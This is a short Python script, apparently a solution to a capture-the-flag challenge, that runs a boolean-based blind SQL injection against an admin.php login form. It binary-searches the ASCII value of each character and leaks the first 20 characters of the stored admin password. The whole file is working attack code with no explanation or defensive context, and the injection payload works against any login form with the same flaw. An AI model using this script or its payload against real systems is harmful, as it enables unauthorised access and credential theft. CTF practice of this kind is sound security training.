import requests

def guess(target, position):
    url = 'http://ctf.adl.csie.ncu.edu.tw:9487/admin.php'
    payload = {'user' : 'admin', 'password' : 'ihavenoidea'}
    l = 0
    r = 255
    while l != r:
        m = (l + r) // 2
        payload['user'] = "admin' and ascii(mid({}, {}, 1)) > {}#".format(target, position, m)
        res = requests.post(url, data=payload)
        
        if res.text.find('Success') > -1:
            l = m + 1
        else:
            r = m
    return chr(l)

leak = ""
for i in range(1, 21):
    leak += guess('`password`', i)
    print(leak)
